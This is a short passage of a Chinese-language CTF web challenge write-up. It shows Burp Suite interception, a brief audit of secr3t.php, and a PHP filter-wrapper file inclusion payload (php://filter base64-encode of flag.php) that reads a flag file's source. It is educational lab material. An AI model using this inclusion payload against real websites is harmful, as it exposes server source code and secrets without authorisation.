<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231659829.png" alt="image-20191029231659829"></p>
<p>尝试BP抓包</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231743833.png" alt="image-20191029231743833"></p>
<p>访问secr3t.php</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029231920584.png" alt="image-20191029231920584"></p>
<p>简单的代码审计</p>
<p>直接file=flag.php</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029232108090.png" alt="image-20191029232108090"></p>
<p>无法直接读取flag.php文件</p>
<p>利用php伪协议</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p>
<p>base64解码</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>MISC</tag>
        <tag>DISABLE_FUNCTIONS</tag>
      </tags>
  </entry>
</search>
